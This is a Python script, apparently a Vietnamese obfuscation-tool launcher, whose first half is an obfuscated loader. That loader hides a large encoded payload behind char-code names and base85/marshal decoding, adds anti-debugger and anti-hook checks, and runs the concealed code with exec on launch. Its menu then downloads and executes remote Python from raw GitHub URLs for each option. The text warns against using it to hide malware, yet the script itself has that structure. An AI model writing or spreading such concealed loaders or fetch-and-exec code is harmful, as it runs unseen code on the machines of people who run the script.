#==≠==≠==≠==≠==≠====≠==≠==≠==≠==≠==≠==#
#Copyright by JunidoKai
#Version : 2.2.4
#Python 3.12 
#07/27/2025 17:56:37 GMT+07:00
#Nếu decode vui lòng để lại comment này
#==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==#
#==≠==Thư Viện==≠==#
import requests, socket, os, sys
from time import sleep
ж=[[115,121,115],[116,105,109,101],[114,97,110,100,111,109],[98,117,105,108,116,105,110,115],[116,114,97,99,101,98,97,99,107],[111,115],[98,97,115,101,54,52],[109,97,114,115,104,97,108]]
for name in ж:
    globals()[''.join(map(chr,name))]=__import__(''.join(map(chr,name)))
юэн=lambda h: bytes(int(h[i:i+2],16) for i in range(0,len(h),2))
Нсл=(lambda m,b: getattr(m,''.join(map(chr,[108,111,97,100,115])))(    getattr(b,''.join(map(chr,[98,56,53,100,101,99,111,100,101])))(        ''.join(chr(int(c)) for c in '96 125 71 48 60 48 48 55 97 55 43 53 115 94 50 48 115 115 73 50 40 51 106 99 41 71 52 37 111 102 48 48 55 88 68 43 53 115 126 52 48 115 115 73 50 40 54 56 68 55 71 120 89 41 104 48 48 55 90 126 43 53 116 53 54 48 115 115 73 50 40 84 67 97 114 72 84 52 49 106 48 48 55 88 77 43 53 116 66 56 48 115 115 73 50 40 84 118 38 119 72 125 119 74 108 48 48 55 97 50 43 53 116 72 65 48 115 115 73 50 40 84 38 59 120 73 114 82 98 110 48 48 55 88 75 43 53 117 116 112 48 115 115 73 50 40 85 73 66 35 86 41 88 40 53 48 48 55 88 69 43 53 117 122 114 48 115 115 73 50 40 53 84 117 48 87 99 51 48 55 48 48 55 88 88 43 53 117 40 116 48 115 115 73 50 40 52 112 68 94 87 45 116'.split())    )))(__import__('marshal'),__import__('base64'))
ЗТШ='БЯЯШЯШХБхэИъЯШЯШХБхэИъЯШтШВЯИъьчЯШХБхэИъЯШЯШХБхэИъЯШЯШБЯъИьхКЗКШБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯхКШББъИьхКВКЗБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯЗЯъКШББъИьККЗКХКьБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯЗЯЗКШББъИьхКтьчКСКХКьБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯЗЯтКШББъИьтьБКЗКХКьБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯЗЯчКШББъИьхКтКЗКШБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯБЯЗКШББъИьхКВьКЯЗБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯтЯБКШББъИьхьКЯЗБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯтЯтКШББъИьхКВьКЯББъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯтЯэКШББъИКтьКЯЗБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯчЯъКШББъИКВКЗБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯьЯэКШББъИьККЯКхьчКСКэБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯЗЯчЯтКШББъИКтКСБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯЗЯэЯККШББъИКШьКЯЗБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯЗЯэЯэКШББъИьтКэКШБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯБЯъЯЗКШББъИКЯКЗКШБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯБЯъЯБКШББъИКхКтКЗКШБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯБЯъЯтКШББъИКхКСКХКьБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯБЯЗЯЗКШББъИьККВКэКьКхьтКЯБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯБЯЗЯтКШББъИКЯКВКэКьКхьтьКБъЯШБъББчВЯъЯЯЯЯчёЯЗЯёЯЯЯхЯёЯчЯёЯБЯБЯъКШББъИБЯЯШЯШХБхэИъЯШЯШХБхэИъЯШчтКхВЯётКХКьБътБВЯИЗКСЯШХБхэИъЯШЯШХБхэИъЯШЯШБЯъИКтКСКХКчБъЯШБъьхКВКЗБъБёБъББХЯхъэъБББъБёБъьхКВьКЯББъБёБъББХБэВэтБББъБёБъьхКВКЗБъБёББХЯхъэЗББъИКтКШКЗБъЯШБъьхКВКЗБъБёБъББХЯхъхВБББъБёБъьтьБКЗКХКьБъБёБъББХБхэёИХЯхъхКХБхэёёБББъБёБъьхКВКЗБъБёББХЯхъхШБББъБЯБёББХЯхъхКБББъъИКёьтБъЯШБъьхКВКЗБъБёБъББчёХБхИхъБББъБёБъьтьБКЗКХКьБъБёБъБББСБББъБёБъьхКВКЗБъБёБъББХБхИхЗчШБББъБъБёБъьтьБКЗКХКьБъБёБъББЯШБББъБёБъьхьКЯЗБъБёБъББЯХББъИКчьБьБКСьББъЯШБъКтКСБъБёБъББХЯхъэтБББъБёБъКЯКВКэКьКхьтьКБъБёБъБББЗБББъБёБъКтКСБъБёБъББХЯхъэчББъИьььББъЯШБъКЯКЗКШБъБёБъББХСёВххБББъБёБъКЯКВКэКьКхьтьКБъБёБъБББЗБББъБёБъКЯКЗКШБъБёБъББХСёВхэББъИБЯЯШЯШХБхэИъЯШЯШХБхэИъЯШтЗКтКШКэКХЯШХБхэИъЯШЯШХБхэИъЯШЯШБЯъИььКХКХБъЯШБъьхКтКЗКШБёББчьБББёьхКВКЗБёББКхБББёьККЗКХКьБёББКэБББёКтКСБёББьтБББёКЯКЗКШБёББКчБББёьККЯКхьчКСКэБёБББътХтХБББёьхКЗКШъИКШКЗБъЯШБъКхКтКЗКШБёББтШБББёКхКСКХКьБёББКэБББёКхКтКЗКШБёББКХБББёКхКСКХКьБёББКхБББёКхКтКЗКШБёББтЗБББёКхКСКХКьБёББКХБББёКхКтКЗКШБёББКхБББёКхКСКХКьБёББьЯСъэСэъёъБББёьхКЗКШъИКИКХКтКёБъЯШБъьхКтКЗКШБёББтИБББёьхьКЯЗБёББьчБББёьхКтьчКСКХКьБёББКХБББёьхКВьКЯББёББКэБББёьхКВьКЯЗБёББКтБББёьхКВКЗБёББКСБББъБёКЯКВКэКьКхьтьКБёБББътёБББёьККВКэКьКхьтКЯБёБъББКЗБББёКЯКЗКШБёББКэБББёьхКЗКШъИКхьтБъЯШБъььКХКХБёьтьБКЗКХКьБёБББъБКБъБББёКШКЗБёьтьБКЗКХКьБёБББъБКБъБББёБъКИКХКтКёъИБЯЯШЯШХБхэИъЯШЯШХБхэИъЯШтэчъЯШХБхэИъЯШЯШХБхэИъЯШЯШБЯъИКтКчККБъКШКЗчСКэьъБхБэЯИъИБъБъБъБъьБКчьЯьъКСКХьЯКчБъЯШБъьБКчьЗьчКчьЯьтьЯБХКьКчьтБхББКхьтьтьъЯИБСБСКёКэКчКШьтьБКЗКэьъБХКЯКСКШБСьБКЗььБХьъКхьъБББэъИБъБъБъБъКэьъчСКЗКтКтьБКчьЯьЯБъЯШБъьЯКСКЯКёКчьтБХКьКчьтКхКСьЯьтКБьэКХКЗКШКчБхьБКчьЯьъКСКХьЯКчБХьтКчьхьтБХьЯьтьБКэьъБхБэБэъИБъБъБъБъьБКчьтьчьБКХБъКэьъчСКЗКтКтьБКчьЯьЯъИКэьъБъЯШБъКШКЗчСКэьъБхБэъИБЯЯШЯШХБхэИъЯШЯШтБКЗКХКХКчьБЯШЯШХБхэИъЯШЯШБЯъИКтКчККБъКШКэКХКхКЗКХКхьЯБхБэЯИъИБъКСьЯБХьЯьэьЯьтКчКШБхББКЯКВьЯБББъКэККБъКСьЯБХКХКЗКШКчБъЯШЯШБъББКХьтБББъКчКВьЯКчБъББКЯКВКчКЗьББББэъИБъКШКЗКЯьчьтКэБъЯШБъККБББББББъБъБъБъБъБъБъБъБъБъБъБъБъБъБъьёКхьтьШчВКХъИХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИЯИъХБИЯёКХБИЯИКХБИъхъХБИъхъХБИъхъХБИЯхъХБИЯИтХБИЯётХБИЯёКХБИЯёКБъХБИъхъХБИъхъХБИъхъХБИъхъХБИЯхъХБИЯётХБИЯИКХБИъхъБъБъБъБъБъьёКтьКЯЗьШтЯКСьъьэьБКэКьКхьтьёьтьБКЗКХКььШБъЯИБъьёКШКЗьШъИХБИъхъХБИъхъХБИъхъБъХБИЯёХХБИЯёСХБИЯёСХБИЯёСХБИЯИъХБИЯётХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИъхъХБИЯхъХБИЯИтХБИЯёКХБИЯёСХБИЯёСХБИЯёСХБИЗэСХБИъхъБъБъБъБъБъьёКтьКЯЗьШтЗКтКШКэКХьёьтьБКЗКХКььШБъБъБъБъБъЯИБъьёььКХКХьШъИХБИЯхъХБИЯхъХБИъхъХБИЯёхХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЗэСХБИъхъХБИъхъБъБъБъБъБъьёКтьКЯЗьШтЗКтКШКэКХьёьтьБКЗКХКььШБъБъБъБъБъЯИБъьёКИКХКтКёьШъИХБИЯёСХБИЯёСХБИЯёьХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯИСХБИЯИтХБИЯИтХБИЯИтъИХБИБёёХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЗёСБъБъБъБъБъьёьхКВКЗьШтХКЗКШКчБъчтКСКСКВьёьтьБКЗКХКььШБъЯИьёьхКЗКШьШъИХБИъхъХБИБёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИъэСХБИъхЗБъБъБъБъБъБъБъБъьёьхКВьКЯБьШБъБъБъБъБъБъБъБъБътьКэьтКхьчКБьёьхКЗКШьШъИХБИъхъХБИъхъХБИЯёСХБИЯёСХБИЗэСХБИъхъХБИъхъХБИъхъХБИъхъьёьхКВКЗьШБъХБИЗётХБИъэКХБИъИКьёьхКЗКШьШХБИъёВХБИБёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЗхКХБИъхъъИХБИъхъХБИъхъХБИЯёСХБИЯёСХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъьёьхКВКЗьШХБИЯёВХБИЯхьХБИЯхёХБИЗэььёьхКЗКШьШХБИъхъХБИъхъХБИБёСХБИЯёСХБИБёёХБИЯёСХБИЗэСХБИБёСХБИЯёСХБИЯёСХБИЯёьХБИъхъБъБъБъБъБъьёКтьКЯЗьШтьКэьтКхьчКББъБъБъьёьтьБКЗКХКььШБъЯИБъьёКтКСьШтъЯтЯъЯттччБчБтСчБьёьхКЗКШьШъИХБИъхъХБИЯхъХБИЯёСХБИЯёСХБИЯИтХБИЯИтХБИЯИтХБИЯИтХБИЯИтХБИЯИВХБИЯИШХБИЯИчХБИЯИтХБИЯИтХБИЯИтХБИЯИтХБИЯИтХБИЯёВХБИЯёСХБИЯхьХБИЗхъХБИъээХБИЯёСХБИЗёСХБИъхъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъьёКтКСьШтъЯтЯъЯттччБчБтСчБьёьхКЗКШьШъИХБИъхъХБИЯёСХБИЯёСХБИЯёСХБИъэёХБИъёёХБИЯёСХБИЗэСХБИъэёХБИъэёХБИъэёХБИъэёХБИъэёХБИъэёХБИЯёСХБИЗёСХБИъэёХБИъёёХБИЯёСХБИЯёСХБИЗхьХБИъхъХБИъхъХБИъхъХБИъхъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъьёКтКСьШтъЯтЯъЯттччБчБтСчБьёьхКЗКШьШъИХБИъхъХБИЯёСХБИЯёСХБИЯёСХБИъхъХБИъхъХБИъхъХБИЯИъХБИЯёХХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯИКХБИЯхъХБИъхъьёКтКСьШХБИЯёСьёьхКЗКШьШХБИъхъХБИЯёСХБИЯёСХБИЗхьХБИъхъХБИъхъХБИъхъХБИъхъъИХБИъхъХБИъээХБИБёСХБИЯёСХБИЯёКХБИЯёХХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИъёСХБИъёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёКХБИЯёХХБИЯёСХБИъэСХБИъхЗХБИъхъХБИъхъХБИъхъХБИъхъБъБъБъБъБъьёьхКтьчКСКХКььШтэчъБъКЯХЗёёИьКЗБъКБХЗёИИЗКХьёьтьБКЗКХКььШБъЯИБъьёьхКВьКЯБьШьёКэьъьШьёьхКЗКШьШъИХБИъхъХБИъхъХБИъхъХБИБёёХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯИКХБИЯётХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИъхьХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъъИХБИъхъХБИъхъХБИъхъХБИъхъХБИъххХБИъёёХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИЯёСХБИъёСХБИъхёХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъъИХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхэХБИъэёХБИъёёХБИъёСХБИъёСХБИъэёХБИъхёХБИъхЗХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъХБИъхъъИьёКтКСьШБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБъБътхКСВЯИъКХКьБъчхКЗБъБШБъчтьБВКёъХЗёёэШКХКьБъчхКЗьёьтьБКЗКХКььШБъКВВЯИъБъКЯХЗёёИьКЗБъьёьККЗКХКььШчККэХЗёёхььтБътХКЗКШБъСъэСхьёёСъэСхьёЯъИъИББББББъИБъКККСьББъчхБъКэКХБъКШКЗКЯьчьтКэЯИъИБъБъьЯьэьЯБХьЯьтКтКСьчьтБХьььБКэьтКчБхчхБэъИБъБъьЯьэьЯБХьЯьтКтКСьчьтБХКККВьчьЯКхБхБэБъъИБъБъьЯКВКчКчьъБхЯъБХЯъЯъЯъЯЗЯъБэъИКШКэКХКхКЗКХКхьЯБхБэъИБЯЯШЯШХБхэИъЯШЯШчЯКСьчКЯьБКчЯШЯШХБхэИъЯШЯШБЯ'
эШР=''.join(Нсл[c] for c in ЗТШ)
ЭчК=lambda: getattr(sys,''.join(map(chr,[103,101,116,116,114,97,99,101])))()
Рбн=type(Exception)
(lambda _: _())(lambda: Рбн('Debugger detected') if ЭчК() is not None else None)
ьцо=traceback.extract_stack
(lambda _: _())(lambda: Рбн('Debugger detected') if any(''.join(map(chr,[112,121,100,101,118])) in getattr(f,'filename') or ''.join(map(chr,[112,100,98])) in getattr(f,'filename') for f in ьцо()) else None)
ЮЗЮ=(lambda:0).__globals__[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))]
ДТх=[getattr(ЮЗЮ,k) for k in ['exec','compile']]
(lambda _: _())(lambda: Рбн('Hook detected') if any(callable(f) and f!=getattr(ЮЗЮ,f.__name__) for f in ДТх) else None)
щЩД=юэн(эШР)
Гют=(lambda _: _())(lambda: getattr(ЮЗЮ,''.join(map(chr,[101,120,101,99])))(getattr(ЮЗЮ,''.join(map(chr,[99,111,109,112,105,108,101])))(щЩД.decode(),'<obf>', ''.join(map(chr,[101,120,101,99]))), globals()))
#==≠==Soucre==≠==#
print(f"\n{wr} OBF này tuy có hỗ trợ ANTI DEBUG nhưng không mạnh\n      Không dùng OBF này vào mục đích che giấu mã độc\n      Miễn trách nhiệm đối với mục đích che giấu mã độc\n")

from prettytable import PrettyTable
from rich.table import Table
from rich.console import Console
from rich.align import Align
from rich import box


def menu_banner():
    table = Table(
    box=box.HEAVY,
    title="[bold cyan]Chọn chế độ OBF[/]",
    border_style="#C8F000",
)
    table.add_column("STT", header_style="bold cyan", justify="center")
    table.add_column("Obfuscate", header_style="white", justify="center")
    table.add_column("Author", header_style="#FF1493", justify="center")
    table.add_column("Status",header_style="green", justify="center")
    table.add_column("Note",header_style="white", justify="center")

    table.add_row(f"[bold yellow]1", f"[bold #008CF0] Emoji", f"[bold #00F000]Zu", f"[bold #00F03C]201", f"[bold italic bright_white]Online")
    table.add_row(f"[bold yellow]2", f"[bold #008CF0] Chine", f"[bold #00F000]NTD[/]", f"[bold #00F03C]201", f"[bold italic bright_white]Online")
    table.add_row(f"[bold yellow]3", f"[bold #008CF0] Shadow", f"[bold #00F000]WhiteNN", f"[bold #00F03C]201", f"[bold italic bright_white]Online")
    table.add_row(f"[bold yellow]4", f"[bold #008CF0] Layer", f"[bold #00F000]JunidoKai", f"[bold #00F03C]201", f"[bold italic bright_green]Online")
    table.add_row(f"[bold yellow]5", f"[bold #008CF0] Japan", f"[bold #00F000]WhiteNN & Zu", f"[bold #F00000]404", f"[bold italic bright_red]Offline")
    table.add_row(f"[bold yellow]6", f"[bold #008CF0] Hangul", f"[bold #00F000]JunidoKai", f"[bold #F00000]404", f"[bold italic bright_red]Offline")
    table.add_row(f"[bold yellow]7", f"[bold #008CF0] Hangul", f"[bold #00F000]JunidoKai", f"[bold #F00000]404", f"[bold italic bright_red]Offline")

    console = Console()
    console.print(Align.center(table))

if __name__ == "__main__":
    menu_banner()

chon = input("Nhập lựa chọn : ").strip()

if chon == '1':
    exec(requests.get('https://raw.githubusercontent.com/serverbywhite/Server/main/server99.py').text)

if chon == '2':
    exec(requests.get('https://raw.githubusercontent.com/serverbywhite/Server/main/server100.py').text)

if chon == '3':
    exec(requests.get('https://raw.githubusercontent.com/serverbywhite/Server/main/server101.py').text)

if chon == '4':
    exec(requests.get('https://raw.githubusercontent.com/serverbywhite/Server/main/server102.py').text)

if chon == '5':
    exec(requests.get('https://raw.githubusercontent.com/serverbywhite/Server/main/server404.py').text)

if chon == '6':
    exec(requests.get('https://raw.githubusercontent.com/serverbywhite/Server/main/server404.py').text)

if chon == '7':
    exec(requests.get('https://raw.githubusercontent.com/serverbywhite/Server/main/server404.py').text)
